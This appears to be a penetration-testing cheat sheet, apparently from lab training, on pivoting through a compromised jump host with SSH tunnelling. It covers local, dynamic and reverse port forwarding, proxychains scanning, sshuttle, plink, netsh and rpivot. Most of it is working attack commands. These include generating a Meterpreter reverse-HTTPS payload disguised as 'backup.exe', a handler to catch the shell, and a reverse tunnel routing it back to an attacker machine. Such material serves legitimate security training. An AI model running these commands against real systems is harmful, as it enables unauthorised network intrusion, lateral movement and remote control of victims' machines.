# SSH Tunneling

**Concept:** You have compromised a "Jump Host" (Pivot) that has two network interfaces (External and Internal). You want to access the Internal network from your Attacker machine. 
**Mechanism:** SSH allows us to encapsulate TCP traffic inside the SSH connection.
## 1. Local Port Forwarding (`-L`)
**Direction:** Attacker -> Pivot -> Target **Use Case:** You want to access a specific service (like a Database or Web Server) on the Internal network that is _blocked_ from the outside, but accessible by the Pivot.

**Syntax:** `ssh -L <LocalPort>:<TargetIP>:<TargetPort> <User>@<PivotIP>`
```shell
# Example: Access MySQL (3306) on the Pivot itself (localhost)
# We map it to our local port 1234.
ssh -L 1234:127.0.0.1:3306 ubuntu@10.129.202.64
```

**Result:**
- Connecting to `127.0.0.1:1234` on your Kali machine actually connects to `127.0.0.1:3306` on the Pivot.
- `mysql -h 127.0.0.1 -P 1234 -u root -p`
## 2. Dynamic Port Forwarding (`-D`)
**Direction:** Attacker -> Pivot -> _Anywhere_ **Use Case:** You want to scan _the entire_ internal network or use multiple tools (Nmap, Browser, RDP). This creates a **SOCKS Proxy**.

**Syntax:** `ssh -D <LocalPort> <User>@<PivotIP>`
```shell
# Create a SOCKS proxy on port 9050
ssh -D 9050 ubuntu@10.129.202.64
```

**Configuration (Proxychains):** Edit `/etc/proxychains4.conf` (or `/etc/proxychains.conf`):
```shell
[ProxyList]
socks4  127.0.0.1 9050
```

**Usage:** Prefix any command with `proxychains` (or `proxychains4`).
```shell
# Nmap Scan (Must use -sT and -Pn)
proxychains nmap -sT -Pn -p 445 172.16.5.19

# RDP Access
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
## 3. Remote/Reverse Port Forwarding (`-R`)
**Direction:** Target -> Pivot -> Attacker 
**Use Case:** You want to catch a **Reverse Shell** from an internal Windows target (`172.16.5.19`) back to your Kali machine (`10.10.14.18`). The Windows target _cannot_ see your Kali IP, but it _can_ see the Pivot (`172.16.5.129`).
**Concept:** We open a port on the Pivot that forwards traffic _back_ to us.

**Step 1: Create Payload (Targeting the Pivot)** The payload points to the **Pivot's Internal IP**, not yours.
```shell
# LHOST = Pivot Internal IP (172.16.5.129)
# LPORT = The port the Windows Target will connect to (8080)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 LPORT=8080 -f exe -o backup.exe
```

**Step 2: Start Listener (Attacker)** Listen on the _final_ destination port (8000).
```shell
# msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 8000
run
```

**Step 3: Establish Tunnel (`-R`)** Tell the Pivot: "Listen on port 8080. Forward anything you get to my machine on port 8000."
```shell
# Syntax: ssh -R <PivotPort>:<AttackerIP>:<AttackerPort> <User>@<PivotIP>
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.202.64 -vN
```

**Step 4: Execute**
- Upload `backup.exe` to the Windows Target.
- Run it.
- Traffic flows: Windows -> Pivot:8080 -> SSH Tunnel -> Kali:8000 -> Meterpreter.
## 4. Alternative Tools
### Sshuttle (VPN over SSH)
**Concept:** A "poor man's VPN". It uses SSH to create a transparent proxy without needing `proxychains`. It modifies your routing table automatically. 
**Requirement:** Python must be installed on the Pivot.
```shell
# Route all traffic for 172.16.5.0/24 through the SSH connection
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/24 -v
```
### Plink.exe (Windows SSH Client)
**Use Case:** You are on a compromised Windows machine and want to create a tunnel _out_.
```powershell
# Create a Dynamic SOCKS proxy on the Windows host
plink.exe -ssh -D 9050 ubuntu@10.129.15.50
```
### Netsh (Windows Native Port Forwarding)
**Use Case:** You have Admin on a Windows Pivot and want to forward a port (like RDP) without external tools.
```powershell
# Forward external port 8080 to internal IP 172.16.5.25 port 3389 (RDP)
netsh interface portproxy add v4tov4 listenaddress=10.129.15.150 listenport=8080 connectaddress=172.16.5.25 connectport=3389

# Verify
netsh interface portproxy show v4tov4
```
### Rpivot (Reverse SOCKS)
**Use Case:** Like Chisel, but python-based. Useful if binary execution is blocked but Python is allowed.
1. **Server (Attacker):** `python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0`
2. **Client (Target):** `python2 client.py --server-ip 10.10.14.18 --server-port 9999`
3. **Use:** Point proxychains to port 9050.